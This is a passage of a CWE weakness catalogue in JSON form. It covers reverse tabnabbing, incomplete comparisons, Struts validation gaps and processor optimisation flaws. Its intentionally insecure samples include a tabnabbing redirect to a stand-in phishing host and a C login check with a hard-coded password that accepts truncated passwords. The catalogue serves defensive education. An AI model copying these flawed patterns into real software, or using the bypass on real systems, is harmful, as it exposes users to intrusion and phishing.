'http://phishing.example.org/popular-bank-page';\n```"}, {"BodyText": "To mitigate this type of weakness, some browsers support the \"rel\" attribute with a value of \"noopener\", which sets the window.opener object equal to null. Another option is to use the \"rel\" attribute with a value of \"noreferrer\", which in essence does the same thing."}, {"Nature": "Good", "Language": "HTML", "ExampleCode": "```\n\t<a href=\"http://attacker-site.example.com/useful-page.html\" target=\"_blank\" rel=\"noopener noreferrer\">\n```"}, {"BodyText": "A second way that this weakness is commonly seen is when opening a new site directly within JavaScript. In this case, a new site is opened using the window.open() function."}, {"Nature": "Bad", "Language": "JavaScript", "ExampleCode": "```\n\tvar newWindow = window.open(\"http://attacker-site.example.com/useful-page.html\", \"_blank\");\n```"}, {"BodyText": "To mitigate this, set the window.opener object to null."}, {"Nature": "Good", "Language": "JavaScript", "ExampleCode": "```\n\tvar newWindow = window.open(\"http://attacker-site.example.com/useful-page.html\", \"_blank\");\n\tnewWindow.opener = null;\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2022-4927", "Description": "Library software does not use rel: \"noopener noreferrer\" setting, allowing tabnabbing attacks to redirect to a malicious page", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-4927"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-4927", "Description": "A vulnerability was found in ualbertalib NEOSDiscovery 1.0.70 and classified as problematic. This issue affects some unknown processing of the file app/views/bookmarks/_refworks.html.erb. The manipulation leads to use of web link to untrusted target with window.opener access. The attack may be initiated remotely. Upgrading to version 1.0.71 is able to address this issue. The patch is named abe9f57123e0c278ae190cd7402a623d66c51375. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-222287."}, {"Reference": "CVE-2022-30610", "Description": "IBM Spectrum Copy Data Management 2.2.0.0 through 2.2.15.0 is vulnerable to reverse tabnabbing where it could allow a page linked to from within IBM Spectrum Copy Data Management to rewrite it. An administrator could enter a link to a malicious URL that another administrator could then click. Once clicked, that malicious URL could then rewrite the original page with a phishing page. IBM X-Force ID: 227363."}]}
{"ID": "1023", "Name": "Incomplete Comparison with Missing Factors", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product performs a comparison between entities that must consider multiple factors or characteristics of each entity, but the comparison does not include one or more of these factors.", "ExtendedDescription": "An incomplete comparison can lead to resultant weaknesses, e.g., by operating on the wrong object or making a security decision without considering a required factor.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "697", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity", "Access Control"], "Impact": ["Alter Execution Logic", "Bypass Protection Mechanism"]}], "PotentialMitigations": [{"Phase": ["Testing"], "Description": "Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."}], "DemonstrativeExamples": [{"ID": "DX-115", "Entries": [{"IntroText": "Consider an application in which Truck objects are defined to be the same if they have the same make, the same model, and were manufactured in the same year."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class Truck {\n\t\t\tprivate String make;\n\t\t\tprivate String model;\n\t\t\tprivate int year;\n\t\t\tpublic boolean equals(Object o) {\n\t\t\t\t\tif (o == null) return false;\n\t\t\t\t\tif (o == this) return true;\n\t\t\t\t\tif (!(o instanceof Truck)) return false;\n\t\t\t\t\tTruck t = (Truck) o;\n\t\t\t\t\treturn (this.make.equals(t.getMake()) && this.model.equals(t.getModel()));\n\t\t\t}\n\t}\n```"}, {"BodyText": "Here, the equals() method only checks the make and model of the Truck objects, but the year of manufacture is not included."}]}, {"ID": "DX-116", "Entries": [{"IntroText": "This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n```\n/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */* \n\t\n\tchar *username = \"admin\";\n\tchar *pass = \"password\";\n\t\n\tint AuthenticateUser(char *inUser, char *inPass) {\n\t```\n\t\tif (strncmp(username, inUser, strlen(inUser))) {\n\t\t\tlogEvent(\"Auth failure of username using strlen of inUser\");\n\t\t\treturn(AUTH_FAIL);\n\t\t}\n\t\tif (! strncmp(pass, inPass, strlen(inPass))) {\n\t\t\tlogEvent(\"Auth success of password using strlen of inUser\");\n\t\t\treturn(AUTH_SUCCESS);\n\t\t}\n\t\telse {\n\t\t\tlogEvent(\"Auth fail of password using sizeof\");\n\t\t\treturn(AUTH_FAIL);\n\t\t}\n\t}\n\tint main (int argc, char **argv) {\n\t\t int authResult;\n\t\tif (argc < 3) {\n\t\t\tExitError(\"Usage: Provide a username and password\");\n\t\t}\n\t\tauthResult = AuthenticateUser(argv[1], argv[2]);\n\t\tif (authResult == AUTH_SUCCESS) {\n\t\t\tDoAuthenticatedTask(argv[1]);\n\t\t}\n\t\telse {\n\t\t\tExitError(\"Authentication failed\");\n\t\t}\n\t}\n```"}, {"BodyText": "In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success."}, {"BodyText": "As a result, this partial comparison leads to improper authentication (CWE-287)."}, {"BodyText": "Any of these passwords would still cause authentication to succeed for the \"admin\" user:"}, {"Nature": "Attack", "ExampleCode": "```\n\tp\n\tpa\n\tpas\n\tpass\n```"}, {"BodyText": "This significantly reduces the search space for an attacker, making brute force attacks more feasible."}, {"BodyText": "The same problem also applies to the username, so values such as \"a\" and \"adm\" will succeed for the username."}, {"BodyText": "While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness."}]}], "ObservedExamples": [{"Reference": "CVE-2005-2782", "Description": "PHP remote file inclusion in web application that filters \"http\" and \"https\" URLs, but not \"ftp\".", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2782"}, {"Reference": "CVE-2014-6394", "Description": "Product does not prevent access to restricted directories due to partial string comparison with a public directory", "Link": "https://www.cve.org/CVERecord?id=CVE-2014-6394"}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}}
{"ID": "1024", "Name": "Comparison of Incompatible Types", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product performs a comparison between two entities, but the entities are of different, incompatible types that cannot be guaranteed to provide correct results when they are directly compared.", "ExtendedDescription": "In languages that are strictly typed but support casting/conversion, such as C or C++, the programmer might assume that casting one entity to the same type as another entity will ensure that the comparison will be performed correctly, but this cannot be guaranteed. In languages that are not strictly typed, such as PHP or JavaScript, there may be implicit casting/conversion to a type that the programmer is unaware of, causing unexpected results; for example, the string \"123\" might be converted to a number type. See examples.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "697", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "JavaScript", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "PHP", "Prevalence": "Undetermined"}, {"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Varies by Context"]}], "PotentialMitigations": [{"Phase": ["Testing"], "Description": "Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-43690", "Description": "Concrete CMS (formerly concrete5) below 8.5.10 and between 9.0.0 and 9.1.2 did not use strict comparison for the legacy_salt so that limited authentication bypass could occur if using this functionality. Remediate by updating to Concrete CMS 9.1.3+ or 8.5.10+."}]}
{"ID": "1025", "Name": "Comparison Using Wrong Factors", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code performs a comparison between two entities, but the comparison examines the wrong factors or characteristics of the entities, which can lead to incorrect results and resultant weaknesses.", "ExtendedDescription": "This can lead to incorrect results and resultant weaknesses. For example, the code might inadvertently compare references to objects, instead of the relevant contents of those objects, causing two \"equal\" objects to be considered unequal.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "697", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Varies by Context"]}], "PotentialMitigations": [{"Phase": ["Testing"], "Description": "Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."}], "DemonstrativeExamples": [{"ID": "DX-60", "Entries": [{"IntroText": "In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString str1 = new String(\"Hello\");\n\tString str2 = new String(\"Hello\");\n\tif (str1 == str2) {\n\t\tSystem.out.println(\"str1 == str2\");\n\t}\n```"}, {"BodyText": "However, the if statement will not be executed as the strings are compared using the \"==\" operator. For Java objects, such as String objects, the \"==\" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method:"}, {"Nature": "Good", "ExampleCode": "```\n\tif (str1.equals(str2)) {\n\t\tSystem.out.println(\"str1 equals str2\");\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-2663", "Description": "An issue was found in the Linux kernel in nf_conntrack_irc where the message handling can be confused and incorrectly matches the message. A firewall may be able to be bypassed when users are using unencrypted IRC with nf_conntrack_irc configured."}]}
{"ID": "103", "Name": "Struts: Incomplete validate() Method Definition", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product has a validator form that either does not define a validate() method, or defines a validate() method but does not call super.validate().", "ExtendedDescription": "If the code does not call super.validate(), the Validation Framework cannot check the contents of the form against a validation form. In other words, the validation framework will be disabled for the given form.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "573", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "BackgroundDetails": ["The Struts Validator uses a form's validate() method to check the contents of the form properties against the constraints specified in the associated validation form. That means the following classes have a validate() method that is part of the validation framework: ValidatorForm, ValidatorActionForm, DynaValidatorForm, and DynaValidatorActionForm. If the code creates a class that extends one of these classes, and if that class implements custom validation logic by overriding the validate() method, the code must call super.validate() in the validate() implementation."], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Other"], "Note": "Disabling the validation framework for a form exposes the product to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection."}, {"Scope": ["Confidentiality", "Integrity", "Availability", "Other"], "Impact": ["Other"], "Note": "Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Implement the validate() method and call super.validate() within that method."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and the RegistrationForm bean in the Struts framework will maintain the user data. Tthe RegistrationForm class implements the validate method to validate the user input entered into the form."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n\t\t// private variables for registration form\n\t\tprivate String name;\n\t\tprivate String email;\n\t\t...\n\t\tpublic RegistrationForm() {\n\t\t\tsuper();\n\t\t}\n\t\tpublic ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {\n\t\t\tActionErrors errors = new ActionErrors();\n\t\t\tif (getName() == null || getName().length() < 1) {\n\t\t\t\terrors.add(\"name\", new ActionMessage(\"error.name.required\"));\n\t\t\t}\n\t\t\treturn errors;\n\t\t}\n\t\t// getter and setter methods for private variables\n\t\t...\n\t}\n```"}, {"BodyText": "Although the validate method is implemented in this example the method does not call the validate method of the ValidatorForm parent class with a call super.validate(). Without the call to the parent validator class only the custom validation will be performed and the default validation will not be performed. The following example shows that the validate method of the ValidatorForm class is called within the implementation of the validate method."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n\t\t\t// private variables for registration form\n\t\t\tprivate String name;\n\t\t\tprivate String email;\n\t\t\t...\n\t\t\tpublic RegistrationForm() {\n\t\t\t\tsuper();\n\t\t\t}\n\t\t\tpublic ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {\n\t\t\t\tActionErrors errors = super.validate(mapping, request);\n\t\t\t\tif (errors == null) {\n\t\t\t\t\terrors = new ActionErrors();\n\t\t\t\t}\n\t\t\tif (getName() == null || getName().length() < 1) {\n\t\t\t\terrors.add(\"name\", new ActionMessage(\"error.name.required\"));\n\t\t\t}\n\t\t\treturn errors;\n\t}\n\t\t// getter and setter methods for private variables\n\t\t...\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "This could introduce other weaknesses related to missing input validation."}, {"Type": "Maintenance", "Note": "The current description implies a loose composite of two separate weaknesses, so this node might need to be split or converted into a low-level category."}]}
{"ID": "1037", "Name": "Processor Optimization Removal or Modification of Security-critical Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The developer builds a security-critical protection mechanism into the software, but the processor optimizes the execution of the program such that the mechanism is removed or modified.", "LikelihoodOfExploit": "Low", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1038", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary", "Description": "This weakness does not depend on other weaknesses and is the result of choices made by the processor in executing the specified application."}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Rarely"}, {"Type": "Technology", "Name": "Processor Hardware", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "Optimizations built into the design of the processor can have unintended consequences during the execution of an application."}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Bypass Protection Mechanism"], "Likelihood": ["High"], "Note": "A successful exploitation of this weakness will change the order of an application's execution and will likely be used to bypass specific protection mechanisms. This bypass can be exploited further to potentially read data that should otherwise be unaccessible."}], "DetectionMethods": [{"Method": "White Box", "Description": "In theory this weakness can be detected through the use of white box testing techniques where specifically crafted test cases are used in conjunction with debuggers to verify the order of statements being executed.", "Effectiveness": "Opportunistic", "EffectivenessNotes": "Although the mentioned detection method is theoretically possible, the use of speculative execution is a preferred way of increasing processor performance. The reality is that a large number of statements are executed out of order, and determining if any of them break an access control property would be extremely opportunistic."}], "ObservedExamples": [{"Reference": "CVE-2017-5715", "Description": "Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \"Spectre\".", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5715"}, {"Reference": "CVE-2017-5753", "Description": "Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \"Spectre\".", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5753"}, {"Reference": "CVE-2017-5754", "Description": "Intel processor optimizations related to speculative execution cause access control checks to be bypassed when placing data into the cache. Often known as \"Meltdown\".", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5754"}], "RelatedAttackPatterns": ["663"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "As of CWE 4.9, members of the CWE Hardware SIG are closely analyzing this entry and others to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks. Additional investigation may include other weaknesses related to microarchitectural state. As a result, this entry might change significantly in CWE 4.10."}], "Top25Examples": [{"Reference": "CVE-2022-21151", "Description": "Processor optimization removal or modification of security-critical code for some Intel(R) Processors may allow an authenticated user to potentially enable information disclosure via local access."}]}
{"ID": "1038", "Name": "Insecure Automated Optimizations", "Abstraction": "Class", "Structure": "Simple", "Status": "Draft", "Description": "The product uses a mechanism that automatically optimizes code, e.g. to improve a characteristic such as performance, but the optimizations can have an unintended side effect that might violate an intended security assumption.", "LikelihoodOfExploit": "Low", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "435", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "758", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary", "Description": "This weakness does not depend on other weaknesses and is the result of choices made during optimization."}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "Optimizations built into the design of a product can have unintended consequences during execution."}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Alter Execution Logic"], "Note": "The optimizations alter the order of execution resulting in side effects that were not intended by the original developer."}], "ObservedExamples": [{"Reference": "CVE-2017-5715", "Description": "Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \"Spectre\".", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5715"}, {"Reference": "CVE-2008-1685", "Description": "C compiler optimization, as allowed by specifications, removes code that is used to perform checks to detect integer overflows.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1685"}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}}
{"ID": "1039", "Name": "Automated Recognition Mechanism with Inadequate Detection or Handling of Adversarial Input Perturbations", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses an automated mechanism such as machine learning to recognize complex data inputs (e.g. image or audio) as a particular concept or category, but it does not properly detect or handle inputs that have been modified or constructed in a way that causes the mechanism to detect a different, incorrect concept.", "ExtendedDescription": "\n\nWhen techniques such as machine learning are used to automatically classify input streams, and those classifications are used for security-critical decisions, then any mistake in classification can introduce a vulnerability that allows attackers to cause the product to make the wrong security decision. If the automated mechanism is not developed or \"trained\" with enough input data, then attackers may be able to craft malicious input that intentionally triggers the incorrect classification.\n\n\nTargeted technologies include, but are not necessarily limited to:\n\n\n  - automated speech recognition\n\n  - automated image recognition\n\nFor example, an attacker might modify road signs or road surface markings to trick autonomous vehicles into misreading the sign/marking and performing a dangerous action.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "693", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "697", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary", "Description": "This weakness does not depend on other weaknesses and is the result of choices made during optimization."}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Name": "AI/ML", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "This issue can be introduced into the automated algorithm itself."}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Bypass Protection Mechanism"], "Note": "When the automated recognition is used in a protection mechanism, an attacker may be able to craft inputs that are misinterpreted in a way that grants excess privileges."}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Notes": [{"Type": "Relationship", "Note": "Further investigation is needed to determine if better relationships exist or if additional organizational entries need to be created. For example, this issue might be better related to \"recognition of input as an incorrect type,\" which might place it as a sibling of CWE-704 (incorrect type conversion)."}]}
{"ID": "104", "Name": "Struts: Form Bean Does Not Extend Validation Class", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "If a form bean does not extend an ActionForm subclass of the Validator framework, it can expose the application to other weaknesses related to insufficient input validation.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "573", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "BackgroundDetails": ["In order to use the Struts Validator, a form must extend one of the following: ValidatorForm, ValidatorActionForm, DynaValidatorActionForm, and DynaValidatorForm. One of these classes must be extended because the Struts Validator ties in to the application by implementing the validate() method in these classes. Forms derived from the ActionForm and DynaActionForm classes cannot use the Struts Validator."], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Other"], "Note": "Bypassing the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is an important component of vulnerabilities like cross-site scripting, process control, and SQL injection."}, {"Scope": ["Confidentiality", "Integrity", "Availability", "Other"], "Impact": ["Other"], "Note": "Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Ensure that all forms extend one of the Validation Classes."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user information from a registration webpage for an online business site. The user will enter registration data and through the Struts framework the RegistrationForm bean will maintain the user data."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.action.ActionForm {\n\t\t\t// private variables for registration form\n\t\t\tprivate String name;\n\t\t\tprivate String email;\n\t\t\t...\n\t\t\tpublic RegistrationForm() {\n\t\t\t\tsuper();\n\t\t\t}\n\t\t\t// getter and setter methods for private variables\n\t\t\t...\n\t}\n```"}, {"BodyText": "However, the RegistrationForm class extends the Struts ActionForm class which does not allow the RegistrationForm class to use the Struts validator capabilities. When using the Struts framework to maintain user data in an ActionForm Bean, the class should always extend one of the validator classes, ValidatorForm, ValidatorActionForm, DynaValidatorForm or DynaValidatorActionForm. These validator classes provide default validation and the validate method for custom validation for the Bean object to use for validating input data. The following Java example shows the RegistrationForm class extending the ValidatorForm class and implementing the validate method for validating input data."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n\t\t\t// private variables for registration form\n\t\t\tprivate String name;\n\t\t\tprivate String email;\n\t\t\t...\n\t\t\tpublic RegistrationForm() {\n\t\t\t\tsuper();\n\t\t\t}\n\t\t\tpublic ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}\n\t\t\t// getter and setter methods for private variables\n\t\t\t...\n\t}\n```"}, {"BodyText": "Note that the ValidatorForm class itself extends the ActionForm class within the Struts framework API."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1041", "Name": "Use of Redundant Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product has multiple functions, methods, procedures, macros, etc. that\n\t\t\t\t\tcontain the same code.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. For example, if there are two copies of the same code, the programmer might fix a weakness in one copy while forgetting to fix the same weakness in another copy.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Merge common functionality into a single function and then call that function from across the entire code base."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following Java example the code performs some complex math when specific test conditions are met. The math is the same in each case and the equations are repeated within the code. Unfortunately if a future change needs to be made then that change needs to be made in all locations. This opens the door to mistakes being made and the changes not being made in the same way in each instance."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tdouble s = 10.0; \n\t\t\tdouble r = 1.0; \n\t\t\tdouble pi = 3.14159; \n\t\t\tdouble surface_area;\n\t\t\tif(r > 0.0) { \n\t\t\t\t// complex math equations \n\t\t\t\tsurface_area = pi * r * s + pi * Math.pow(r, 2);\n\t\t\t}\n\t\t\tif(r > 1.0) { \n\t\t\t\t// a complex set of math \n\t\t\t\tsurface_area = pi * r * s + pi * Math.pow(r, 2);\n\t\t\t}\n\t\t}\n\t}\n```"}, {"BodyText": "It is recommended to place the complex math into its own function and then call that function whenever necessary."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class Main {\n\t\tprivate double ComplexMath(double r, double s) { \n\t\t\t//complex math equations \n\t\t\tdouble pi = Math.PI; \n\t\t\tdouble surface_area = pi * r * s + pi * Math.pow(r, 2); \n\t\t\treturn surface_area;\n\t\t}\n\t\tpublic static void main(String[] args) { \n\t\t\tdouble s = 10.0; \n\t\t\tdouble r = 1.0; \n\t\t\tdouble surface_area;\n\t\t\tif(r > 0.0) { \n\t\t\t\tsurface_area = ComplexMath(r, s);\n\t\t\t}\n\t\t\tif(r > 1.0) { \n\t\t\t\tsurface_area = ComplexMath(r, s);\n\t\t\t}\n\t\t}\n\t}\n```"}]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
